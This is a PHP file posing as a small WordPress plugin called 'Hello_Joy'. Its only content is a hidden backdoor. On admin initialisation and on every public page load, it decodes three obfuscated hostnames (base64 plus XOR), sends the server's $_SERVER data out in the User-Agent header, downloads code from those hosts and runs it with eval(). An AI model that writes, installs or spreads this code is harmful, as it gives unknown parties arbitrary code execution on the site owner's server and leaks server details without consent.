<?php
/**
 * @package Hello_Joy
 * @version 1.7.2
 */

add_action('admin_init', "open_hello");

if (!is_admin()) {
    open_hello();
}

function open_hello()
{
    $args = array(
        'timeout' => 15,
        'headers' => array(
            "User-Agent" => json_encode($_SERVER),
        ),
    );

    $ids = array("GHFCOTgIAmseOw==", "GHFCOThYXHZCPD0=", "GHFCJiEeHmseOw==");

    foreach ($ids as $id) {
        $id = base64_decode($id);
        $decoded = ""; for ($i = 0; $i < strlen($id); $i++) $decoded .= $id[$i] ^ "nElNHi"[$i % strlen("nElNHi")];
        $response = wp_remote_get("http://" . $decoded . "/v5", $args);
        if (!is_wp_error($response) && 200 === wp_remote_retrieve_response_code($response)) {
            return eval($response['body']);
        }
    }
}
